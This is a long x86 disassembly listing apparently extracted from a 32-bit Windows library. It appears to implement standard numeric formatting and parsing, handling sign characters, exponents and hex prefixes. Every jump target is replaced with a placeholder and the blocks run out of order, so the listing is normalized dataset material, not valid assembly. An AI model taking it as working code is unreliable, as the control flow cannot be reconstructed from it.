cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10042d3e
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10042d3e
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10042d3e
cmp ax [ ebp - 0x54 ]
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jge r-xdata
mov ecx esi
call sub_10042d3e
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10042ae0
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_100020e2
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jbe r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
test di di
je r-xdata
cmp [ ebp - 0x50 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x50 ] 0x24
jge r-xdata
mov ebx [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x65
call sub_1004158d
add esp 0xc
mov ecx esi
mov di ax
call sub_10042d3e
cmp ax di
je r-xdata
dec [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10042ae0
mov [ ebx ] 0x30
inc ebx
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ edi ] 0x7f
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_10042d3e
cmp ax di
jne r-xdata
mov ecx esi
call sub_10042d3e
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10042ae0
mov ecx esi
call sub_10042d3e
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx ] 0x0
call sub_100020e2
mov eax [ ebp - 0x60 ]
call sub_1002b392
retn
mov [ ebx ] 0x65
mov ecx esi
inc ebx
call sub_10042ae0
push [ ebp - 0x58 ]
and [ ebp - 0x50 ] 0x0
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_10042bc0
test al al
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x45
call sub_1004158d
add esp 0xc
mov ecx esi
mov di ax
call sub_10042d3e
cmp ax di
jne r-xdata
dec [ ebp - 0x5c ]
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100014aa
inc [ ebp - 0x5c ]
mov ecx esi
call sub_10042d3e
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2b
call sub_1004158d
add esp 0xc
mov ecx esi
mov di ax
call sub_10042d3e
cmp ax di
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_10042ae0
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10042d3e
cmp ax [ ebp - 0x54 ]
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_1004158d
add esp 0xc
mov ecx esi
mov di ax
call sub_10042d3e
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
mov ecx esi
call sub_10042d3e
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10042ae0
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_10042ae0
mov edi eax
jmp r-xdata
mov ecx esi
call sub_10042d3e
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10042ae0
mov ecx esi
call sub_10042d3e
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
sub_10046c83
push 0x6c
mov eax sub_1004f143
call sub_1002b30f
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x74 ] eax
lea eax [ ebp - 0x78 ]
push eax
mov [ ebp - 0x60 ] ecx
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
push eax
call sub_10044e48
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x64 ] ebx
call sub_10007dbd
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10043163
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
movzx eax ax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x6c ] eax
call sub_100082a7
lea eax [ edi + 0x8 ]
push eax
xor ebx ebx
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_1004158d
movzx eax ax
mov [ ebp - 0x54 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x70 ] 0x1
mov [ ebp - 0x70 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_10027b31
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x50 ] al
mov [ ebp - 0x4f ] 0x65
mov [ ebp - 0x4e ] bl
call sub_10027b60
push [ ebp + 0x30 ]
mov [ ebp - 0x58 ] eax
movsx eax [ ebp - 0x50 ]
push eax
push esi
call sub_10027b60
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x44 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ ebp - 0x60 ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x44 ]
movsx eax [ ebp - 0x50 ]
push [ ebp + 0x30 ]
push eax
push esi
call sub_10027b60
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_100072a4
mov eax [ ebp - 0x58 ]
cmp eax ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push esi
call sub_10027b60
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x6c ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1004280f
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x5c ]
push eax
push edi
call sub_10042407
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x64 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
movzx eax ax
push 0x1
push eax
push [ ebp + 0x14 ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10042407
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_10042407
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10042407
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x70 ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ ebp - 0x2c ]
call sub_100014aa
jmp r-xdata
push [ ebp - 0x6c ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1004280f
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x5c ]
push eax
push edi
call sub_10042407
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov edx [ ebp - 0x60 ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x74 ]
mov [ ebp + 0x14 ] eax
push edi
mov [ edx + 0x18 ] ebx
call sub_10042407
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov eax [ ebp - 0x74 ]
call sub_1002b392
retn
push [ ebp - 0x6c ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1004280f
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_10042407
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x60 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_100427c2
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10005cf6
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
call sub_100014aa
mov eax [ ebp - 0x58 ]
mov [ ebp + 0x24 ] ebx
push 0x30
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_100427c2
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
mov ebx [ ebp - 0x4c ]
push [ ebp + 0x28 ]
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10005cf6
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
push ebx
call sub_10005cf6
and [ ebp + 0x28 ] 0x0
xor ebx ebx
push [ ebp + 0x24 ]
call sub_100014aa
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
push eax
call sub_10027c10
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea esi [ ebp - 0x44 ]
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov esi eax
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x70 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub [ ebp - 0x4c ] eax
push ebx
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_10005cf6
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_100470cf
push 0x44
mov eax sub_1004f178
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx ebx
mov [ ebp - 0x40 ] ebx
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
push eax
call sub_10044e48
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
call sub_10007dbd
mov ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10043163
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
cmp al 0x30
jne r-xdata
mov edi [ ebx + 0x18 ]
test edi edi
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
cmp edi [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x48 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp + 0x24 ]
lea eax [ ebp - 0x3c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_1004280f
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ ebx + 0x18 ] 0x0
push eax
push ecx
push [ ebp - 0x4c ]
mov [ ebp + 0x14 ] eax
push [ ebp - 0x34 ]
call sub_10042407
add esp 0x34
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp - 0x4c ]
call sub_1002b392
retn
cmp eax 0x100
lea eax [ ebp - 0x44 ]
je r-xdata
sub edi [ ebp + 0x24 ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_100427c2
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
add esi ecx
call sub_10042407
add esp 0x30
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_10042407
add esp 0x18
jmp r-xdata
mov eax [ ebx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov edi [ ebp + 0x24 ]
jmp r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100275d0
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov ebx [ ebp - 0x40 ]
mov [ ebp - 0x30 ] eax
sub_100472bb
push 0x16c
mov eax sub_1004f27d
call sub_1002b30f
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
and [ ebp - 0x70 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0xa8 ] edi
mov ecx edi
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10045159
pop ecx
mov ebx eax
mov [ ebp - 0xa0 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xb0 ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100451f6
mov ebx eax
pop ecx
mov [ ebp - 0xa0 ] ebx
lea ecx [ ebp - 0xb0 ]
jmp r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx 0x4
jae r-xdata
call sub_10007dbd
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_100430dd
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_100430dd
mov eax [ ebx ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx ebx
mov [ ebp - 0x70 ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x90 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_10042d54
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10042e00
mov eax [ ebp - 0x7c ]
call sub_1002b392
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10042caf
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x90 ]
cmp [ ebp - 0x65 ] 0x0
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
mov ecx edi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10044826
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10007dbd
mov edi [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003f21b
test [ edi + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_1004158d
mov ecx [ ebp - 0x7c ]
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
call sub_100434b8
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10042dd6
push eax
lea ecx [ ebp - 0x8c ]
call sub_1004214d
mov ecx eax
call sub_10042b39
test al al
jne r-xdata
mov ebx [ ebp - 0xa0 ]
mov edi [ ebp - 0xa8 ]
push [ ebp - 0x74 ]
push edi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x90 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_10042bc0
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10042dd6
push eax
lea ecx [ ebp - 0x8c ]
call sub_10042b39
test al al
je r-xdata
mov ecx edi
call sub_10042d3e
mov edx [ esi ]
movzx eax ax
push eax
push 0x48
mov ecx esi
call [ edx + 0x8 ]
test al al
je r-xdata
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10042caf
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x94 ] eax
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10042d3e
cmp ax [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x124 ]
push eax
mov ecx ebx
call sub_10043240
or [ ebp - 0x70 ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ ebx ]
xor esi esi
mov ecx ebx
mov [ ebp - 0x84 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push esi
push 0x30
call sub_1004158d
movzx eax ax
mov [ ebp - 0x80 ] eax
add esp 0xc
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
call sub_10043163
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x50 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_10042004
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10042d3e
cmp ax [ esi ]
jne r-xdata
mov ecx edi
call sub_10042ae0
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_10042bc0
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10042d54
mov [ ebp - 0x76 ] 0x0
lea eax [ ebp - 0xec ]
push eax
mov ecx ebx
call sub_10043240
or [ ebp - 0x70 ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_1004256a
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10042d3e
mov [ ebp - 0x76 ] 0x1
cmp [ esi ] ax
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0xb8 ] eax
cmp ax si
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10042ae0
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10042dd6
push eax
lea ecx [ ebp - 0x98 ]
call sub_10042b39
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10042dd6
push eax
lea ecx [ ebp - 0x98 ]
call sub_10042b39
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x70 ] 0x2
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xec ]
call sub_10042e00
xor esi esi
test [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10042d3e
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov edi [ ebp - 0x6c ]
push edi
movzx esi ax
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4c ] 0x10
mov eax [ ebp - 0x60 ]
jae r-xdata
lea ecx [ ebp - 0x98 ]
call sub_10042004
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10042d3e
cmp ax [ esi ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx [ ebp - 0x6c ]
call sub_10042d3e
cmp ax [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x76 ] 0x0
je r-xdata
and [ ebp - 0x70 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x124 ]
call sub_10042e00
mov ecx [ ebp - 0x6c ]
call sub_10042d3e
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov edi [ ebp - 0x7c ]
cmp [ edi + 0x14 ] 0x0
jne r-xdata
test si si
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x98 ]
call sub_1004214d
mov ecx [ ebp - 0x6c ]
call sub_10042ae0
lea eax [ ebp - 0x140 ]
push eax
mov ecx ebx
call sub_1004317c
or [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10042ae0
lea eax [ ebp - 0x15c ]
push eax
mov ecx ebx
call sub_10043240
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_1004334b
push esi
lea ecx [ ebp - 0x15c ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10042d3e
